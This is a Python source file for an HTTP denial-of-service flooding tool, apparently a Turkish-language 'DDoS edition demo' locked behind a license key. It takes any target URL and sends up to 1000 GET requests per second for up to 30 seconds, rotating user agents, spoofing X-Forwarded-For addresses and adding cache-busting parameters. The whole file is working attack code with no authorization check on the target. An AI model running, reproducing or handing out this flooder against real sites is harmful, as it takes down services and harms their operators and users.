import asyncio
import os
import random
import socket
import sys
import time
import urllib.parse

PROGRAM_NAME = "GUARDSCANTİTAN DDOS EDİTİON DEMO"
DEVELOPER_TAG = "DEVELOPER:SOCCONCOFFİN"
VALID_KEYS = {"GUARDSCANTİTANDEMO", "GUARDSCANTITANDEMO"}
MAX_SEC = 30
MAX_RPS = 1000

BANNER_ART = r"""
  ____ _   _    _    ____  ____  ____   ____    _    _   _ _____ ___ _____  _    _   _
 / ___| | | |  / \  |  _ \|  _ \/ ___| / ___|  / \  | \ | |_   _|_ _|_   _|/ \  | \ | |
| |  _| | | | / _ \ | |_) | | | \___ \| |     / _ \ |  \| | | |  | |  | | / _ \ |  \| |
| |_| | |_| |/ ___ \|  _ <| |_| |___) | |___ / ___ \| |\  | | |  | |  | |/ ___ \| |\  |
 \____|\___//_/   \_\_| \_\____/|____/ \____/_/   \_\_| \_| |_| |___| |_/_/   \_\_| \_|
"""

USER_AGENTS = [
    "GuardScanTitan-Demo/1.0 (Linux)",
    "GuardScanTitan-Demo/1.0 (Windows)",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/129.0.0.0 Safari/537.36",
]


def clear_screen() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.flush()


def ask_license() -> None:
    clear_screen()
    print(BANNER_ART)
    print(f"=== {PROGRAM_NAME} ===")
    for _ in range(3):
        key = input("License Key: ").strip()
        if key in VALID_KEYS or key.upper() in VALID_KEYS:
            clear_screen()
            print(BANNER_ART)
            print(f"{DEVELOPER_TAG}")
            print("=== GUARDSCANTİTAN SALDIRI MENÜSÜ ===\n")
            return
        print("[!] Hatali license key.")
    sys.exit(1)


def parse_address(raw: str):
    text = raw.strip()
    if "://" not in text:
        text = "http://" + text
    parsed = urllib.parse.urlparse(text)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    return host, port, path


async def flood_loop(host: str, port: int, path: str, duration: int) -> None:
    ip = socket.gethostbyname(host)
    end_t = time.monotonic() + duration
    interval = 1.0 / MAX_RPS
    next_tick = time.monotonic()
    count = 0

    async def send_req(idx: int) -> None:
        nonlocal count
        writer = None
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=1.0,
            )
            ua = random.choice(USER_AGENTS)
            xff = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            sep = "&" if "?" in path else "?"
            req = (
                f"GET {path}{sep}r={idx} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"X-Forwarded-For: {xff}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode("ascii", errors="ignore")
            writer.write(req)
            await asyncio.wait_for(writer.drain(), timeout=1.0)
            count += 1
            print(f"[DDOS #{count}] -> {ip}:{port}{path} | XFF={xff} | STATUS=SENT")
        except Exception:
            count += 1
            print(f"[DDOS #{count}] -> {ip}:{port}{path} | STATUS=TIMEOUT/DROP")
        finally:
            if writer is not None:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

    tasks = set()
    idx = 0
    while time.monotonic() < end_t:
        now = time.monotonic()
        if now < next_tick:
            await asyncio.sleep(min(next_tick - now, end_t - now))
            continue
        idx += 1
        t = asyncio.create_task(send_req(idx))
        tasks.add(t)
        t.add_done_callback(tasks.discard)
        next_tick += interval
        if next_tick < now - 0.05:
            next_tick = now + interval

    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    print(f"\n[TAMAMLANDI] Toplam istek: {count} | {DEVELOPER_TAG}")


def main() -> None:
    ask_license()
    try:
        sec_raw = input(f"Saniye (1-{MAX_SEC}): ").strip()
        duration = max(1, min(int(sec_raw), MAX_SEC))
    except ValueError:
        duration = 10

    addr_raw = input("Adres (ornek: http://127.0.0.1:8080): ").strip()
    if not addr_raw:
        addr_raw = "http://127.0.0.1:8080"

    host, port, path = parse_address(addr_raw)
    try:
        asyncio.run(flood_loop(host, port, path, duration))
    except socket.gaierror as exc:
        print(f"[HATA] Adres cozumlenemedi: {exc}", file=sys.stderr)
    except KeyboardInterrupt:
        print("\n[DURDURULDU]")


if __name__ == "__main__":
    main()